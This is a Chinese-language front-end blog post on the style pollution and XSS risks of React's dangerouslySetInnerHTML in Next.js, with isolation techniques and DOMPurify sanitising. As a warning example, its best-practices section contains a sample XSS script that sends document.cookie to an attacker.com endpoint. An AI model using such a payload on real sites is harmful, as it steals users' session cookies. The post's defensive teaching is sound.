---
title: Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南
date: 2025-08-15 18:01:00
tags:
  - 前端
  - JS
categories:
  - 前端
cover: [static/common/nextjs.jpg]
author: Tako Senpai
---

# Next.js 中使用 dangerouslySetInnerHTML 样式的踩坑指南

在 Web 开发领域，Next.js 作为一个基于 React 的流行框架，为开发者提供了高效构建应用的能力。在某些场景下，我们可能会用到`dangerouslySetInnerHTML`这个属性。本文将深入探讨在 Next.js 中使用`dangerouslySetInnerHTML`处理样式时可能遇到的问题，并提供一些解决方案。

## dangerouslySetInnerHTML 是什么？

在 React（Next.js 基于 React）中，`dangerouslySetInnerHTML` 是一种用于直接设置 HTML 内容到 DOM 元素的方式。React 默认会对渲染的内容进行转义，以防止跨站脚本攻击（XSS）。但 `dangerouslySetInnerHTML` 提供了一种“逃生舱口”，允许我们绕过这种默认的转义机制。

其使用方式如下（以 TypeScript 为例）：

```tsx
import React from "react";

const rawHtml = "<p>这是一段直接插入的HTML内容</p>";

const MyComponent: React.FC = () => {
  return <div dangerouslySetInnerHTML={{ __html: rawHtml }} />;
};

export default MyComponent;
```

从上述代码可以看出，我们通过传递一个包含`__html`键的对象给`dangerouslySetInnerHTML`属性，来设置元素的内部 HTML。需要注意的是，这个属性的命名中包含 “dangerously”，正是因为它可能带来安全风险，如 XSS 攻击。如果 HTML 内容来自用户输入或不可信的第三方源，未经严格的安全检查就直接使用`dangerouslySetInnerHTML`，恶意用户可能会注入恶意脚本，从而获取敏感信息或控制应用程序。

## 在 Next.js 中使用 dangerouslySetInnerHTML 时样式相关的问题

### 样式污染

当我们在`innerHTML`中包含`<style>`标签时，会出现意想不到的样式污染问题。假设我们有一个包含`<style>`标签的 HTML 字符串，如下：

```js
const htmlWithStyle = `
<style>
   body {
      background-color: yellow;
   }
</style>
<p>这是一段测试文本</p>
`;
```

然后在组件中使用`dangerouslySetInnerHTML`来渲染它：

```tsx
const StyleProblemComponent: React.FC = () => {
  return <div dangerouslySetInnerHTML={{ __html: htmlWithStyle }} />;
};
```

此时，页面上所有的`body`元素的背景色都会被设置为黄色，即便我们在项目中使用了像 Tailwind 这样的 CSS 框架，其设置的样式也会被覆盖。这是因为`<style>`标签中的样式规则是全局生效的，一旦通过`dangerouslySetInnerHTML`插入到页面中，就会对整个页面的样式产生影响。

### 样式清除说明

需要注意的是，通过 `dangerouslySetInnerHTML` 插入的 `<style>` 标签只会随着组件卸载（unmount）时被移除。如果你将 `<style>` 标签插入到全局作用域（如 `document.head`），这些样式会持续影响页面，直到手动移除。因此，**全局样式污染风险依然存在**，应尽量避免在 HTML 字符串中插入全局样式。

在 Next.js 中切换路由时，只有当页面组件被卸载，相关 DOM 节点才会被移除，样式才会消失。如果 `<style>` 标签被插入到 `head` 或通过 JS 动态插入，则不会自动清除。

## SSR 场景下的注意事项

Next.js 默认支持服务端渲染（SSR）。在 SSR 场景下，`dangerouslySetInnerHTML` 可能导致服务端渲染和客户端渲染的内容不一致（Hydration 警告），尤其是当 HTML 内容包含动态数据或脚本时。建议：

- 保证服务端和客户端渲染的 HTML 内容完全一致。
- 避免在 SSR 阶段插入依赖浏览器 API 的内容。

## 样式隔离解决方案

### 添加类名

在实际项目中，我们常常会将 HTML 内容存储在 CMS（内容管理系统）中，然后通过 `dangerouslySetInnerHTML` 渲染到页面。此时，为了避免样式污染，可以采用如下方式：

1. **为嵌入的 HTML 添加唯一的容器类名**，如 `cms-content`：

   ```html
   <!-- CMS 存储的 HTML 内容 -->
   <style>
     .cms-content h1 {
       color: #0070f3;
     }
     .cms-content p {
       font-size: 16px;
     }
   </style>
   <div class="cms-content">
     <h1>标题</h1>
     <p>正文内容</p>
   </div>
   ```

2. **所有 style 标签中的样式都加上该类名作为选择器前缀**，确保样式只作用于容器内部。

只要这个类名足够独特（如 `cms-content`），就不会影响页面中其他元素。建议在 CMS 编辑器中约定样式书写规范，或在渲染前自动为 style 内容加前缀。

### 使用 CSS Modules

CSS Modules 是一种将 CSS 样式模块化的方法，在 Next.js 中可以很方便地使用。通过 CSS Modules，每个 CSS 文件都被视为一个模块，其中定义的类名在该模块内是唯一的，不会与其他模块冲突。

首先，创建一个 CSS Module 文件，例如`styles.module.css`：

```css
/* styles.module.css */
.myCustomStyle {
  color: red;
}
```

然后在组件中引入并使用该样式：

```tsx
import React from "react";
import styles from "./styles.module.css";

const htmlWithText = "<p>这是一段带有样式的文本</p>";

const StyleIsolationComponent: React.FC = () => {
  return (
    <div
      className={styles.myCustomStyle}
      dangerouslySetInnerHTML={{ __html: htmlWithText }}
    />
  );
};

export default StyleIsolationComponent;
```

这样，`myCustomStyle`这个类名只会在当前组件中生效，不会影响其他组件的样式，从而实现了样式隔离。

### Shadow DOM

Shadow DOM 提供了一种将 DOM 元素及其样式封装起来的方式，使得它们与页面的其他部分隔离开。在 Next.js 中使用 Shadow DOM 相对复杂一些，需要借助一些工具库，如`react-shadow`。

安装`react-shadow`：

```
npm install react-shadow
```

使用示例：

```tsx
import React from "react";
import { Shadow } from "react-shadow";

const htmlWithStyle = `
<style>
   p {
      color: blue;
   }
</style>
<p>这是一段在Shadow DOM中的文本</p>
`;

const ShadowDOMComponent: React.FC = () => {
  return (
    <Shadow>
      <div dangerouslySetInnerHTML={{ __html: htmlWithStyle }} />
    </Shadow>
  );
};

export default ShadowDOMComponent;
```

在上述代码中，`react-shadow`创建了一个 Shadow DOM 环境，其中的样式不会影响到外部的页面元素，有效地实现了样式隔离。

## sanitizer 的用法（以 DOMPurify 为例）

由于 `dangerouslySetInnerHTML` 存在安全风险，当 HTML 内容来自不可信源时，我们需要对其进行净化（sanitize）。[DOMPurify](https://github.com/cure53/DOMPurify) 是一个流行的用于净化 HTML 的库，可以有效地去除 HTML 中的恶意脚本，防止 XSS 攻击。

安装 DOMPurify：

```sh
npm install dompurify
```

在 Next.js 项目中使用 DOMPurify（仅客户端）：

```tsx
import React from "react";
import DOMPurify from "dompurify";

// 假设这是来自不可信源的HTML内容
const untrustedHtml = `
<script>alert('恶意脚本')</script>
<p>这是一段正常的文本</p>
`;

const sanitizedHtml =
  typeof window !== "undefined" ? DOMPurify.sanitize(untrustedHtml) : "";

function SanitizeComponent() {
  return <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />;
}

export default SanitizeComponent;
```

### SSR 场景下的 DOMPurify 用法

如果你需要在服务端渲染时净化 HTML，可以结合 `jsdom` 和 `dompurify` 的 Node 版本：

```js
import createDOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);
const sanitizedHtml = DOMPurify.sanitize(untrustedHtml);
```

在上述代码中，`DOMPurify.sanitize`方法会分析`untrustedHtml`，去除其中的`<script>`标签等可能存在安全风险的内容，然后将净化后的 HTML 通过`dangerouslySetInnerHTML`渲染到页面上，从而保证了应用的安全性。

## 关于 XSS 攻击

XSS（Cross - Site Scripting）攻击是一种常见的 Web 安全漏洞，攻击者通过在网页中注入恶意脚本，当用户浏览该网页时，恶意脚本就会在用户的浏览器中执行。这些恶意脚本可以获取用户的敏感信息，如 Cookie、登录凭证等，或者进行一些恶意操作，如篡改页面内容、重定向用户等。

## 最佳实践与安全建议

在使用 `dangerouslySetInnerHTML` 时，如果不进行适当的安全处理，就很容易引入 XSS 漏洞。**永远不要直接渲染用户输入的 HTML 内容！**

例如，恶意用户可能会输入如下内容：

```html
<script>
  // 窃取用户Cookie并发送到攻击者服务器
  const xhr = new XMLHttpRequest();
  xhr.open("POST", "https://attacker.com/steal", true);
  xhr.send(document.cookie);
</script>
```

如果应用没有对用户输入进行严格的过滤和净化，这段恶意脚本就会在用户的浏览器中执行，导致用户信息泄露。因此，在使用 `dangerouslySetInnerHTML` 时，务必结合安全措施，如使用 DOMPurify 等 sanitizer 库对输入进行净化，以防止 XSS 攻击。

### 总结

- 避免在 HTML 字符串中插入全局样式。
- SSR 场景下注意内容一致性和 DOMPurify 的用法。
- 永远不要直接渲染用户输入的 HTML。
- 必须使用 DOMPurify 等库净化所有不可信 HTML。

在 Next.js 中使用`dangerouslySetInnerHTML`时，我们需要充分了解其带来的样式问题和安全风险，并采取合适的解决方案来确保应用的稳定性和安全性。通过正确的样式隔离方法和对不可信 HTML 内容的净化处理，我们可以在享受`dangerouslySetInnerHTML`带来的便利的同时，避免潜在的问题。

> （注：文档部分内容可能由 AI 生成）
